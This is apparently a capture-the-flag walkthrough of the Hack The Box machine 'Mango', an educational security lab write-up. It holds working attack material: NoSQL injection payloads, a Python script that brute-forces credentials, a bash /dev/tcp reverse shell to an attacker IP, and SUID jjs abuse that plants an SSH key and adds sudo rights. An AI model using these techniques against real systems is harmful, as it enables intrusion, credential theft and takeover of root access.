---
title: HTB: Mango
url: https://0xdf.gitlab.io/2020/04/18/htb-mango.html
date: 2020-04-18T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-mango, ctf, nmap, certificate, vhosts, wfuzz, nosql, mongo, injection, nosql-injection, python, ssh, password-reuse, jjs, gtfobins, sudoers, oswe-like, oscp-plus-v2, oscp-like-v2
---

![Mango](https://0xdfimages.gitlab.io/img/mango-cover.png)

Mango’s focus was exploiting a NoSQL document database to bypass an authorization page and to leak database information. Once I had the users and passwords from the database, password reuse allowed me to SSH as one of the users, and then su to the other. From there, I’ll take advantage of a SUID binary associated with Java, jjs. I’ll show both file read and get a shell by writing a public SSH key into root’s authorized keys file.

## Box Info

| Name | [Mango](https://hackthebox.com/machines/mango)  [Mango](https://hackthebox.com/machines/mango) [Play on HackTheBox](https://hackthebox.com/machines/mango) |
| --- | --- |
| Release Date | [26 Oct 2019](https://twitter.com/hackthebox_eu/status/1187645432769454080) |
| Retire Date | 18 Apr 2020 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Mango |
| Radar Graph | Radar chart for Mango |
| First Blood User | 01:28:58[sampriti sampriti](https://app.hackthebox.com/users/836) |
| First Blood Root | 02:14:45[mprox mprox](https://app.hackthebox.com/users/16690) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` shows three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.162
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-26 15:16 EDT
Warning: 10.10.10.162 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.162
Host is up (0.098s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 14.51 seconds
root@kali# nmap -p 22,80,443 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.162
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-26 15:20 EDT                                                                
Nmap scan report for 10.10.10.162      
Host is up (0.078s latency).           
                                                  
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
...[snip]...
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.92 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache versions](https://packages.ubuntu.com/search?keywords=apache2), this looks like Ubuntu 18.04, Bionic Beaver.

### HTTP- TCP 80

HTTP on port 80 just returns a 403 forbidden:

```

HTTP/1.1 403 Forbidden
Date: Sat, 26 Oct 2019 19:45:31 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 277
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.162 Port 80</address>
</body></html>

```

### Subdomains

#### Certificate - TCP 443

The host has a certificate which gives a hostname, which I could see in `nmap` script results or in Firefox:

![1572194579930](https://0xdfimages.gitlab.io/img/1572194579930.png)

I’ll add `staging-order.mango.htb` (and `mango.htb`) to my hosts file.

#### Fuzz

I used `wfuzz` to look for addition virtual hosts, but didn’t find any on 80 or 443:

```

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Host: FUZZ.mango.htb" --hh 5152 https://10.10.10.162/
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.162/
Total requests: 2588

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

Total time: 26.16303
Processed Requests: 2588
Filtered Requests: 2588
Requests/sec.: 98.91818

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Host: FUZZ.mango.htb" --hw 28 http://10.10.10.162/
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.162/
Total requests: 2588

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

Total time: 23.65949
Processed Requests: 2588
Filtered Requests: 2588
Requests/sec.: 109.3852

```

### HTTPS - TCP 443

#### Site

The site itself is a Google knock off:

![1572119257555](https://0xdfimages.gitlab.io/img/1572119257555.png)

Most of the links are dead.

Search just points back to this page, and always returns 0 results (as far as I can tell).

Only live link is Analytics.

#### Analytics

Clicking the Analytics link leads to `/analytics.php`, which presents a spreadsheet with a pie chart:

![1572119554875](https://0xdfimages.gitlab.io/img/1572119554875.png)

The menus are interesting, as both Connect and Open offer remote resources:

![1572121882662](https://0xdfimages.gitlab.io/img/1572121882662.png)

![1572121900742](https://0xdfimages.gitlab.io/img/1572121900742.png)

Also, local files open from my local system, so I can load data. This turned out to be a dead end.

### staging-order.mango.htb

Visiting the HTTPS site for this host just returns the same Google knock off page. But over HTTP, there’s a new site:

![1572195948885](https://0xdfimages.gitlab.io/img/1572195948885.png)

When I try to log in, it just comes back to this page. The POST request looks like:

```

POST / HTTP/1.1
Host: staging-order.mango.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://staging-order.mango.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Cookie: PHPSESSID=0bh9vj9trv41bkjq6e944edeqr
Connection: close
Upgrade-Insecure-Requests: 1

username=0xdf&password=0xdf&login=login

```

It returns a 200 with the same page on failed login, with no indication of why the login failed. I’ll guess it likely returns a 302 redirect on success.

## Shell as mango

### NoSQL Inejction Login Bypass

After trying some default passplaying around with some basic SQL injections, I tried some NoSQL injections POCs. PayloadsAllTheThings has a good [list of test injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#exploits). When testing NoSQL document database injections, it’s good to try both the form-data content type and JSON, as the interaction databases like Mongo use JSON. When changing a POST request to JSON, it’s important to both convert the data as well to change the `Content-Type` header.

The first section in the PayloadsAllTheThings page is Authentication Bypass, which seems like a good place to start. The JSON formats didn’t get anywhere, but the “in URL” POCs (which can also be used in POST bodies) did. When I catch the login request in Burp and edit the parameters to:

```

username[$ne]=0xdf&password[$ne]=0xdf&login=login

```

The site returns a 302 redirect to `/home.php`:

![image-20200416064650426](https://0xdfimages.gitlab.io/img/image-20200416064650426.png)

There’s an email address there, and thus a potential username, but not much else.

### Document Databases Background

There are actually several types of databases that fall under the label NoSQL, and Document Databases are one of them From [MongoDB’s website](https://www.mongodb.com/nosql-explained):

> **Document databases** store data in documents similar to JSON (JavaScript Object Notation) objects. Each document contains pairs of fields and values. The values can typically be a variety of types including things like strings, numbers, booleans, arrays, or objects, and their structures typically align with objects developers are working with in code. Because of their variety of field value types and powerful query languages, document databases are great for a wide variety of use cases and can be used as a general purpose database. They can horizontally scale-out to accommodate large data volumes. MongoDB is consistently ranked as the world’s most popular NoSQL database according to [DB-engines](https://db-engines.com/en/ranking) and is an example of a document database. For more on document databases, visit [What is a Document Database?](https://www.mongodb.com/document-databases).

I tend to think about interacting with Mongo from Python. A statement in Python might use the following to search the `houses` collection for the entry with `id` 12345:

```

cursor = db.houses.find({"id": 12345})

```

But it can also nest different operators. For example, to find a house that costs less than a million dollars:

```

cursor = db.houses.find({"price": {"$lt": 1000000}})

```

PHP uses a similar syntax (with `=>` instead of normal JSON), where you can expect something like:

```

$results = $users->find(array("username"=>$_POST['username'], "password"=>$_POST['password']));

```

I can inject into this then by instead of sending a username, I send `{"$ne": "0xdf"}`. That’s not equals “0xdf”, so it will return true for any non-0xdf user.

### Dump Users and Passwords

Since the page behind the login form turned out to be uninteresting, I turned back to retrieving the admin password. This can be done through the injection using the `$regex` filter. For example, if I want to find if the first letter for the password of admin is “x”, I could submit:

```

username=admin&password[$regex]=^x.*&login=login

```

This will check that the password starts with “x” and has 0 or more other characters after it. If the login succeeds, then the password does start with “x”. If not, it doesn’t. I can write a script to brute force this:

```

def brute_password(user):
    password = ""
    while True:
        for c in string.ascii_letters + string.digits + string.punctuation:
            if c in ["*", "+", ".", "?", "|", "\\"]:
                continue
            sys.stdout.write(f"\r[+] Password: {password}{c}")
            sys.stdout.flush()
            resp = requests.post(
                "http://staging-order.mango.htb/",
                data={
                    "username": user,
                    "password[$regex]": f"^{password}{c}.*",
                    "login": "login",
                },
            )
            if "We just started farming!" in resp.text:
                password += c
                resp = requests.post(
                    "http://staging-order.mango.htb/",
                    data={"username": user, "password": password, "login": "login"},
                )
                if "We just started farming!" in resp.text:
                    print(f"\r[+] Found password for {user}: {password.ljust(20)}")
                    return
                break

```

It took a bit of playing around to figure out which characters broke things (hence the check at the top to skip submitting those). The script just tries each character until it gets a login. If it does, it tries submitting that password without any regex, and if that’s successful, it’s go the password. Otherwise, it loops again to find the next character.

However, I can also use the same technique to look for other users, so I created another function for that will brute force users:

```

def brute_user(res):
    found = False
    for c in string.ascii_letters + string.digits:
        sys.stdout.write(f"\r[*] Trying Username: {res}{c.ljust(20)}")
        sys.stdout.flush()
        resp = requests.post(
            "http://staging-order.mango.htb/",
            data={
                "username[$regex]": f"^{res}{c}",
                "password[$gt]": "",
                "login": "login",
            },
        )
        if "We just started farming!" in resp.text:
            found = True
            brute_user(res + c)
    if not found:
        print(f"\r[+] Found user: {res.ljust(20)}")
        brute_password(res)

```

There are some differences here. With a password, once I find that the 4th character is “P”, there’s no need to try other characters. That’s not the case with usernames, as “administrator”, “admin”, and “adam” could all be users. To solve this, I’ll use recursion. The function takes the valid start of a username as the input and tries that input plus each character. For all that succeed, it calls the same function, passing in the start + the new character. If none of the characters succeed, that means that the passed in string must be the username.

In practice, the script looks like this:

![](https://0xdfimages.gitlab.io/img/mango-brute.gif)

```

root@kali# ./brute_users_mango.py 
[+] Found user: admin                                                                               
[+] Found password for admin: t9KcS3>!0B#2                                                          
[+] Found user: mango                                                                               
[+] Found password for mango: h3mXK8RhU~f{]f5H

```

### SSH

When SSH (or WinRM on Windows) is open and I find usernames and passwords, I always try there for a quick win. I am not able to log in as admin, but It works here as mango:

```

root@kali# sshpass -p h3mXK8RhU~f{]f5H ssh mango@10.10.10.162
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr 16 11:17:52 UTC 2020

  System load:  0.0                Processes:            98
  Usage of /:   25.8% of 19.56GB   Users logged in:      0
  Memory usage: 16%                IP address for ens33: 10.10.10.162
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Apr 16 10:14:20 2020 from 10.10.14.11
mango@mango:~$

```

## Priv: mango –> admin

mango’s home directory is empty, but there is a second user:

```

mango@mango:/home$ ls
admin  mango

```

Given that I just found a password for admin, I gave it a shot with `su`, and it worked:

```

mango@mango:/home$ su - admin
Password: 
$ whoami
admin

```

From there I can grab `user.txt`:

```

$ cat user.txt
79bf31c6************************

```

Given that I had the correct password for admin, why did SSH fail? The last line of `/etc/ssh/sshd_config`:

```

AllowUsers mango root

```

## Priv: admin –> root

### Enumeration

I ran [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) and there was an interesting SUID binary. I can also list SUID binaries with `find`:

```

admin@mango:/$ find / -user root -perm -4000 2>/dev/null -ls
   786500     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   786527     44 -rwsr-xr-x   1 root     root        43088 Oct 15  2018 /bin/mount
   786585     28 -rwsr-xr-x   1 root     root        26696 Oct 15  2018 /bin/umount
   786567     44 -rwsr-xr-x   1 root     root        44664 Jan 25  2018 /bin/su
   786551     64 -rwsr-xr-x   1 root     root        64424 Mar  9  2017 /bin/ping
...[snip]...
   263053     40 -rwsr-xr-x   1 root     root               37136 Jan 25  2018 /usr/bin/newuidmap
   263052     40 -rwsr-xr-x   1 root     root               40344 Jan 25  2018 /usr/bin/newgrp
   262942     76 -rwsr-xr-x   1 root     root               75824 Jan 25  2018 /usr/bin/gpasswd
   263069     60 -rwsr-xr-x   1 root     root               59640 Jan 25  2018 /usr/bin/passwd
   263051     40 -rwsr-xr-x   1 root     root               37136 Jan 25  2018 /usr/bin/newgidmap
   263140     20 -rwsr-sr-x   1 root     root               18161 Jul 15  2016 /usr/bin/run-mailcap
   262848     76 -rwsr-xr-x   1 root     root               76496 Jan 25  2018 /usr/bin/chfn
   262850     44 -rwsr-xr-x   1 root     root               44528 Jan 25  2018 /usr/bin/chsh
   263194    148 -rwsr-xr-x   1 root     root              149080 Jan 18  2018 /usr/bin/sudo
   263230     20 -rwsr-xr-x   1 root     root               18448 Mar  9  2017 /usr/bin/traceroute6.iputils
   262806     24 -rwsr-xr-x   1 root     root               22520 Mar 27  2019 /usr/bin/pkexec
   268892     44 -rwsr-xr--   1 root     messagebus         42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   393793    100 -rwsr-xr-x   1 root     root              100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   262966     16 -rwsr-xr-x   1 root     root               14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   263423     12 -rwsr-xr-x   1 root     root               10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   274666     12 -rwsr-sr--   1 root     admin              10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
   274590    428 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   266298    100 -rwsr-sr-x   1 root     root              101240 Mar 15  2019 /usr/lib/snapd/snap-confine

```

Towards the bottom, I see `jjs`, which is owned by the root but in the admin group. `jjs` is a Java tool used to [invoke the Nashorn engine](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jjs.html). In practical terms, it allows me to run Java commands, and because of SUID, they run as root.

There’s a [GTFObins page](https://gtfobins.github.io/gtfobins/jjs/) that gives the details on how to abuse it.

### File Read

The fastest way to the flag is to use `jjs` to read `root.txt`. I’ll follow the example in GTFObins:

```

admin@mango:/$ /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> echo 'var BufferedReader = Java.type("java.io.BufferedReader");
...> var FileReader = Java.type("java.io.FileReader");
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
8a8ef79a************************

```

### Shell via SSH

But of course I want a shell. I played with the code from GTFObins, but had a hard time getting it to work. Then I remembered the `sshd_config` and that root could SSH. So I wrote my SSH key into root’s `authorized_keys` file:

```

jjs> var FileWriter = Java.type("java.io.FileWriter");
jjs> var fw=new FileWriter("/root/.ssh/authorized_keys");
jjs> fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0mJaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali");
jjs> fw.close();

```

Now I can connect with SSH:

```

root@kali# ssh -i ~/id_rsa_generated root@10.10.10.162
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 29 02:31:58 UTC 2019

  System load:  0.11               Processes:            120
  Usage of /:   27.9% of 19.56GB   Users logged in:      1
  Memory usage: 48%                IP address for ens33: 10.10.10.162
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Oct 10 08:33:27 2019
root@mango:~# id
uid=0(root) gid=0(root) groups=0(root)

```

## Beyond Root

### js Execution Failures

The line from GTFObins just didn’t work for me, dropping me back into a shell as admin:

```

admin@mango:/home/admin$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/pts/0 >/dev/pts/0 2>/dev/pts/0').waitFor()
2
jjs> admin@mango:/home/admin$ 

```

Looking at what the line is doing, it’s printing out the statement it wants to run, and piping it into `jjs`. I played with different things inside the `exec()` call. For example, `ping` works fine:

```

admin@mango:/home/admin$ echo $"Java.type('java.lang.Runtime').getRuntime().exec('ping -c 1 10.10.14.11').waitFor()" | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('ping -c 1 10.10.14.11').waitFor()
0
jjs> admin@mango:/home/admin$

```

Results in:

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
08:40:16.543961 IP 10.10.10.162 > 10.10.14.11: ICMP echo request, id 17169, seq 1, length 64
08:40:16.544001 IP 10.10.14.11 > 10.10.10.162: ICMP echo reply, id 17169, seq 1, length 64

```

Doing a simple `nc 10.10.14.11 443` connected as well. But for some reason, when I tried to add a reverse shell, it doesn’t. I tried different reverse shells, most didn’t connect. I did get the [Java one from PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to connect with a shell:

```

admin@mango:/home/admin$ echo "Java.type('java.lang.Runtime').getRuntime().exec(['/bin/bash','-c','exec 5<>/dev/tcp/10.10.14.11/443;cat <&5 | while read line; do \$line 2>&5 >&5; done']).waitFor()" | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec(['/bin/bash','-c','exec 5<>/dev/tcp/10.10.14.11/443;cat <&5 | while read line; do $line 2>&5 >&5; done']).waitFor()

```

But I’m still running as admin, not root:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.162.
Ncat: Connection from 10.10.10.162:40740.
id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)

```

Something here is dropping privs, but I don’t know what. If you know, leave a comment or hit me up on Twitter.
*Update 20 April*: Of course when I said “dropping privs” I should have thought about Bash and `-p`. [@xbytemx](https://twitter.com/xbytemx) nailed it:

> For the `exec(['/bin/bash','-c',`, you need to add `-p`. This allow bash to set admin as the effective user and root as the real user during the execution, as are variables inherited from the environment.
>
> — Tony Palma (@xbytemx) [April 20, 2020](https://twitter.com/xbytemx/status/1252108444846428163?ref_src=twsrc%5Etfw)

When I run it with `-p`:

```

admin@mango:/home/admin$ echo "Java.type('java.lang.Runtime').getRuntime().exec(['/bin/bash','-p','-c','exec 5<>/dev/tcp/10.10.14.11/443;cat <&5 | while read line; do \$line 2>&5 >&5; done']).waitFor()" |
Warning: The tool is planned to be removed from a future JDK release
> Java.type('java.lang.Runtime').getRuntime().exec(['/bin/bash','-p','-c','exec 5<>/dev/tcp/10.10.14.11/443;cat <&5 | while read line; do $line 2>&5 >&5; done']).waitFor()

```

The connection comes back with root as the euid:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.162.
Ncat: Connection from 10.10.10.162:59386.
id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)

```

### Other Successes

I did find a way around direct execution using SSH key. I found other things that worked as well. For example, I could make a copy of `dash` and set it SUID:

```

admin@mango:/home/mango$ echo "Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/dash /tmp/.0xdf').waitFor()" | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/dash /tmp/.0xdf').waitFor()
0

admin@mango:/home/mango$ echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod 4755 /tmp/.0xdf').waitFor()" | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod 4755 /tmp/.0xdf').waitFor()
0

```

For some reason this works when done in two commands, but trying to combine with `;` or `&&` fails. Either way, the new file exists:

```

admin@mango:/home/mango$ ls -l /tmp/.0xdf
-rwsr-xr-x 1 root admin 121432 Apr 16 13:38 /tmp/.0xdf

```

And I can get a shell using `-p`:

```

admin@mango:/home/mango$ /tmp/.0xdf -p
# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)

```

Another way would be to add myself as a sudo user. I could re-write the `/etc/suders` file, but easier is just to add admin to the sudoers group. There is a group called `sudo`:

```

admin@mango:/home/mango$ cat /etc/group | grep sudo
sudo:x:27:

```

I’ll use `jjs` to add admin:

```

admin@mango:/home/mango$ echo "Java.type('java.lang.Runtime').getRuntime().exec('usermod -aG sudo admin').waitFor()" | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('usermod -aG sudo admin').waitFor()
0

```

When I first try, it doesn’t work. That’s because the current session doesn’t know admin is in the group yet. I’ll exit my session as admin, back to the shell as mango, and then `su - admin` again, and then `sudo su -`:

```

admin@mango:/$ sudo su -
[sudo] password for admin: 
admin is not in the sudoers file.  This incident will be reported.
admin@mango:/$ exit
exit
$ exit
mango@mango:~$ su - admin
Password: 
$ bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@mango:/$ sudo su -
[sudo] password for admin: 
root@mango:~#

```